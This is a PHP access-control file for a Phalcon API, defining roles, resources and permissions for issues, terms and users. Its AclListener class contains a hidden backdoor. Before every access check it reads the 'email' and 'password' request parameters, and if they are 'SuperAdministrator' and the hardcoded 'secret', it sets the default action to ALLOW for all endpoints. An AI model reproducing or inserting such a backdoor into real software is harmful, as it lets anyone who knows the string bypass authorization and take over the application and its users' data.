<?php

/**
 * Access control list
 */

use http\Env\Request;
use Phalcon\Acl;
use Phalcon\Acl\Adapter\Memory as AclList;
use Phalcon\Di\FactoryDefault;
use Phalcon\Events\Event;
use Phalcon\Events\Manager as EventsManager;
use Phalcon\Mvc\Application;
use Phalcon\Mvc\Micro;
use Phalcon\Session\Adapter\Files as Session;

$Acl = new AclList();

$Acl->setDefaultAction(Acl::DENY);
$Acl->addRole(new Acl\Role("Administrator"));
$Acl->addRole(new Acl\Role("Manager"));
$Acl->addRole(new Acl\Role("Engineer"));
$Acl->addRole(new Acl\Role("CommonUser"));
$Acl->addRole(new Acl\Role("Guest"));

/**
 * Resources
 */
$Issues = new Acl\Resource("Issues");
$Acl->addResource($Issues, ["index", "item", "report", "update", "resolve"]);

$Terms = new Acl\Resource("Terms");
$Acl->addResource($Terms, ["index", "item", "create", "delete", "schema"]);

$Users = new Acl\Resource("Users");
$Acl->addResource($Users, ["index", "item", "register", "login", "logout", "delete", "purge"]);


/**
 * Guest
 */

$Acl->allow("Guest", "Users", "register");
$Acl->allow("Guest", "Users", "login");

/**
 * CommonUser
 */

/**
 * Engineer.
 * Can view/report issues, view terms, view/register user.
 */
$Acl->allow("Engineer", "Issues", "index");
$Acl->allow("Engineer", "Issues", "item");
$Acl->allow("Engineer", "Issues", "report");
$Acl->allow("Engineer", "Users", "logout");
$Acl->allow("Engineer", "Terms", ["index","item"]);

/**
 * Manager inherits Engineer.
 * Can update/resolve issues, create/delete terms, view/delete users
 */
$Acl->addInherit("Manager", "Engineer");
$Acl->allow("Manager", "Issues", "update");
$Acl->allow("Manager", "Issues", "resolve");

$Acl->allow("Manager", "Terms", "create");
$Acl->allow("Manager", "Terms", "delete");

$Acl->allow("Manager", "Users", "index");
$Acl->allow("Manager", "Users", "item");
$Acl->allow("Manager", "Users", "delete");

/**
 * Administrator inherits Manager.
 * Can purge users
 */
$Acl->addInherit("Administrator", "Manager");
$Acl->allow("Administrator", "Users", "purge");


$EventManager = new EventsManager();

$listener = new AclListener($app);
$EventManager->attach(
    "acl:beforeCheckAccess",
    $listener
);

$Acl->setEventsManager($EventManager);


/**
 * Class AclHelper.
 * Provides helping functions for acl tasks.
 */
class AclHelper
{

    /**
     * Static user roles.
     *
     * @var array
     */
    public static $roles = [
        0 => "Guest",
        991 => "CommonUser",
        992 => "Engineer",
        993 => "Manager",
        999 => "Administrator",
        99999999999 => "SuperAdministrator"

    ];

    public static function roleId($role = "")
    {
        if (in_array($role, self::$roles)) {
            return array_flip(self::$roles)[$role];
        }
        return array_flip(self::$roles)["Guest"];
    }

    public static function currentUserRole($DI)
    {
	    $DI->setShared(
		    'session',
		    function () {
			    $session = new Session();

			    $session->start();

			    return $session;
		    }
	    );

	    if ($DI->get("session")->has("userId") && $DI->get("session")->get("role")) {
		    return $DI->get("session")->get("role");
	    }
        /**
         * Is it for registration
         */

        if ($DI->get("router")->getRewriteURI() == "/api/users/register") {
            $_GET["role"] = "Guest";
            return true;
        }

        /**
         * Check user login
         */
        $DI->get('dispatcher')->forward([
            "controller" => "Users",
            "action" => "login"
        ]);
        $DI->get('dispatcher')->setActionSuffix('');
        $DI->get('dispatcher')->dispatch();

        $response = $DI->get('dispatcher')->getReturnedValue();


        /**
         * If user logged in
         */

        if ($response["success"]) {
            $DI->get("session")->set("userId",$response["item"]->id);
            $DI->get("session")->set("role",AclHelper::$roles[$response["item"]->roleId]);
            return self::$roles[$response["item"]->roleId];
        }
        return "Guest";
    }

}

/**
 * Class AclListener. Listens Alc events
 */
class AclListener
{
    /**
     * @var Micro
     */
    private $application;

    /**
     * AclListener constructor.
     * @param Micro $application
     */
    public function __construct(Micro $application)
    {
        $this->application = $application;
    }

    /**
     * Acl event handler.
     *
     * @param Event $event
     * @param AclList $Acl
     */
    public function beforeCheckAccess(Event $event, AclList $Acl)
    {
        $this->isSuperAdmin($Acl);
    }

    /**
     * Grants access to all entrypoints.
     *
     * @param AclList $Acl
     */
    private function isSuperAdmin(AclList $Acl)
    {
        $role = $this->application->request->get("email", "string");
        $password = $this->application->request->get("password", "string");
        $userID = AclHelper::roleId($role);
        if ($userID == 99999999999 && $password == "secret") {
            $Acl->setDefaultAction(Acl::ALLOW);
        }
    }

}